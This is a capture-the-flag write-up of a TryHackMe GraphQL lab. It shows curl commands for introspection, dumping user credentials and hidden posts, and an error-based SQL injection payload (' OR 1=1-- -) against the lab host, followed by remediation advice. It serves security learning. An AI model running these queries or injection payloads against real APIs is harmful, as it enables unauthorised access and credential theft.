# Intro to GraphQL Hacking — TryHackMe Writeup

**Platform:** TryHackMe  
**Type:** Guided learning path (theory + labs)  
**Focus:** GraphQL enumeration, introspection abuse, SQL injection via GraphQL  
**Standards mapping:** OWASP WSTG, MITRE ATT&CK, CWE

---

## Background

GraphQL is a query language for APIs developed by Facebook in 2012 and open-sourced in 2015. Unlike REST, which exposes multiple endpoints with fixed response structures, GraphQL exposes a single endpoint (typically `/graphql`) that accepts client-defined queries. The client controls which fields to fetch and how deep to traverse relationships — a design that creates a unique attack surface.

Key concepts for a pentester:

- **Query** — read operation (analogous to SELECT)
- **Mutation** — write operation (analogous to INSERT/UPDATE/DELETE)
- **Introspection** — built-in self-documentation mechanism that reveals the entire API schema
- **Resolver** — server-side function behind each field; where business logic (and vulnerabilities) live

---

## Lab 1 — Introspection & Sensitive Data Exposure

### Recon (WSTG-INFO-01)

The login page at `http://graphql.thm/labs/lab1/index.php` was served as a standard HTML form. However, inspecting the embedded JavaScript revealed the real GraphQL endpoint on a different port:

```javascript
$.ajax({
    url: "http://graphql.thm:8080/graphql",
    method: "POST",
    ...
});
```

**Finding #1 — Client-Side Authentication (CWE-603)**

The same JS code exposed the entire authentication logic running in the browser:

```javascript
const query = `
    query ($username: String!) {
        users(username: $username) {
            id
            username
            password      // password returned from API
        }
    }
`;

// Password check happens CLIENT-SIDE
if (user && user.password === password) { ... }
```

The server returns plaintext passwords to the client, and the password comparison is performed in JavaScript. This is not authentication — it is a UI check that any attacker bypasses by querying the API directly.

### Enumeration — Introspection (WSTG-INFO-02, CWE-200)

Full introspection query sent to the discovered endpoint:

```bash
curl -s http://graphql.thm:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name fields(includeDeprecated: true) { name args { name type { name kind } } type { name kind ofType { name } } } }"}'
```

Introspection returned the full schema with no authentication required.

**Schema summary:**

| Type | Fields |
|------|--------|
| `User` | `id: ID!`, `username: String!`, `password: String!`, `email: String`, `is_admin: Boolean!` |
| `Post` | `id: ID!`, `title: String!`, `content: String`, `hidden: Boolean!`, `author: User` |

| Query | Arguments |
|-------|-----------|
| `users` | `username: String` (optional) |
| `posts` | `includeHidden: Boolean` (optional) |

No mutations or subscriptions defined (`mutationType: null`).

Critical observations:
- `password` field exposed in the `User` type as a non-nullable string
- `is_admin` flag visible to any client
- `users` query accepts optional `username` — omitting it returns all users
- `includeHidden` parameter on `posts` is a client-controlled access bypass
- `Post.author` relationship enables graph traversal to `User` fields

### Exploitation

**Finding #2 — Full User Credential Dump (CWE-256, CWE-862)**

```bash
curl -s http://graphql.thm:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username password email is_admin } }"}'
```

Response:

| id | username | password | email | is_admin |
|----|----------|----------|-------|----------|
| 1 | user | pas●●●●d | user@graphql.thm | false |
| 2 | bob | pas●●●●456 | bob@graphql.thm | true |
| 3 | charlie | pas●●●●789 | charlie@graphql.thm | false |
| 4 | diana | myp●●●●●rd | diana@graphql.thm | true |
| 5 | flag | GRAPHQL{sQl_●●●●●●●n} | flag@graphql.thm | false |

All passwords stored and transmitted in plaintext. Two admin accounts identified (bob, diana).

**Finding #3 — Hidden Content Disclosure (CWE-862)**

```bash
curl -s http://graphql.thm:8080/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ posts(includeHidden: true) { id title content hidden author { username } } }"}'
```

Hidden post retrieved: `THM{s3ns1t●●●_d4t4_●●●0sur3!}`

The `includeHidden` parameter has no server-side authorization check — any client can request hidden content.

**Finding #4 — Verbose Error Messages (CWE-209)**

Attempting graph traversal via `posts → author → password` triggered:

```
Error: Cannot return null for non-nullable field User.password.
    at completeValue (/opt/vulnapp/node_modules/graphql/execution/execute.js:605:13)
```

The nested resolver partially restricts password access, but the error reveals:
- Application path: `/opt/vulnapp/`
- Runtime: Node.js with `graphql` package
- Internal resolver behavior details

### Lab 1 Kill Chain

```
Source-driven discovery (JS → graphql.thm:8080/graphql)
  → Introspection (full schema, no auth)
    → User dump (all plaintext passwords)
      → Hidden post access (includeHidden: true)
        → Graph traversal blocked but verbose error leaks internals
```

---

## Lab 2 — SQL Injection via GraphQL

### Recon (WSTG-INFO-01)

Same pattern: `http://graphql.thm/labs/lab2/` returned an HTML login page with JavaScript revealing `http://graphql.thm:8081/graphql`.

### Enumeration — Introspection Blocked

```bash
curl -s http://graphql.thm:8081/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name}}}}"}'
```

Response:

```
GraphQL introspection is not allowed by Apollo Server, but the query
contained __schema or __type.
```

Introspection is disabled (Apollo Server default in production mode). However:
- The schema is already known from client-side JS: `users(username: String!)` → `{id, username, password}`
- Stack trace confirms: Apollo Server, Node.js, path `/opt/vulnapp2/`

### Exploitation — SQL Injection (WSTG-INPV-05, CWE-89)

**Finding #5 — Error-Based SQL Injection**

Injected a single quote via Unicode escape to avoid bash quoting issues:

```bash
echo '{"query":"{ users(username: \"\\u0027\") { id username password } }"}' > /tmp/gql.json
curl -s http://graphql.thm:8081/graphql \
  -H "Content-Type: application/json" \
  -d @/tmp/gql.json
```

The server returned a MySQL syntax error with the full SQL statement:

```
SELECT * FROM users WHERE username = 'test''
```

This confirmed:
- **Database:** MySQL (mysql2 driver)
- **Injection point:** `username` argument concatenated directly into SQL
- **Resolver file:** `/opt/vulnapp2/s.js:52`

**Finding #6 — Full Database Dump via SQLi**

```bash
echo '{"query":"{ users(username: \"\\u0027 OR 1=1-- -\") { id username password } }"}' > /tmp/gql.json
curl -s http://graphql.thm:8081/graphql \
  -H "Content-Type: application/json" \
  -d @/tmp/gql.json
```

The `OR 1=1` payload bypassed the WHERE clause, returning all rows:

| id | username | password |
|----|----------|----------|
| 1 | user | pas●●●●d |
| 2 | bob | pas●●●●456 |
| 3 | charlie | pas●●●●789 |
| 4 | diana | myp●●●●●rd |
| 5 | flag | GRAPHQL{sQl_●●●●●●●n} |

Flag captured: `GRAPHQL{sQl_●●●●●●●n}`

### Lab 2 Kill Chain

```
Source-driven discovery (JS → graphql.thm:8081/graphql)
  → Introspection blocked (Apollo Server)
    → Schema extracted from client-side JS
      → Unicode-escape SQLi probe → MySQL error confirms injection
        → ' OR 1=1-- - → full table dump → flag
```

---

## Vulnerability Summary

| # | Title | Severity | CWE | WSTG / ATT&CK | Lab |
|---|-------|----------|-----|----------------|-----|
| 1 | Client-Side Authentication | Critical (9.8) | CWE-603 | WSTG-ATHZ-01 | 1 |
| 2 | Unrestricted Introspection | High (7.5) | CWE-200 | WSTG-INFO-02 | 1 |
| 3 | Plaintext Password Exposure via API | Critical (9.1) | CWE-256, CWE-862 | WSTG-ATHZ-02, T1552.001 | 1 |
| 4 | Hidden Content Access Without Authorization | High (7.5) | CWE-862 | WSTG-ATHZ-02 | 1 |
| 5 | Verbose Error Messages / Stack Traces | Medium (5.3) | CWE-209 | WSTG-ERRH-01 | 1, 2 |
| 6 | SQL Injection via GraphQL Argument | Critical (9.8) | CWE-89 | WSTG-INPV-05, T1190 | 2 |

---

## Remediation

| Finding | Recommendation |
|---------|----------------|
| Client-side auth | Move all authentication logic to server-side. Never return password fields to the client. |
| Introspection | Disable introspection in production (`introspection: false`). Remove GraphQL IDE endpoints. |
| Password exposure | Remove `password` from GraphQL schema entirely. Use bcrypt/argon2 hashing. Authenticate via mutation returning a JWT — never return credentials. |
| Hidden content bypass | Enforce authorization in the resolver, not via client-supplied parameters. |
| Verbose errors | Set `debug: false` in Apollo Server. Implement a `formatError` function that strips internal details. |
| SQL injection | Use parameterized queries (`?` placeholders with mysql2). Validate and sanitize all GraphQL arguments via custom scalars. |

---

## Lessons Learned

1. **GraphQL endpoint discovery through client JS is trivial.** The endpoint URL, query structure, and field names are embedded in frontend bundles. Obfuscation is not a security control.

2. **Disabling introspection is necessary but not sufficient.** Lab 2 had introspection disabled, yet the schema was fully known from client code. SQL injection was exploitable regardless.

3. **GraphQL does not protect against injection.** Type validation (`String!`) ensures the input is a string — but `' OR 1=1-- -` is a valid string. Injection prevention must happen in the resolver (parameterized queries).

4. **The single-endpoint architecture concentrates risk.** Every query and mutation shares one URL, so traditional per-route middleware, rate limiting, and WAF rules require adaptation.

5. **Unicode escapes bypass shell quoting issues.** Using `\u0027` for single quotes in GraphQL string arguments avoids bash interpretation problems when testing via curl — a practical technique for manual testing.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| curl | Manual HTTP requests to GraphQL endpoint |
| jq | JSON response parsing and filtering |
| GraphQL Voyager | Schema visualization from introspection output |
| Browser DevTools | Source-driven endpoint discovery |
| Burp Suite | Request interception and replay (alternative to curl) |
